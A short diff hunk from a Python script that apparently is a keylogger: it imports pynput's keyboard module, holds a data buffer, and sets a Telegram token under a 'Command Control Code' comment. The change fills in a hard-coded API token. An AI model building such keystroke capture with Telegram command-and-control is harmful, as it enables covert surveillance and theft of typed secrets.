@@ -9,7 +9,7 @@ from pynput import keyboard
 data = ""
 
 # Telegram API Key
-TOKEN = "" # Your API Key
+TOKEN = "66f64201daab339e25ae9ca97e07869a" # Your API Key
 
 
 # Command Control Code
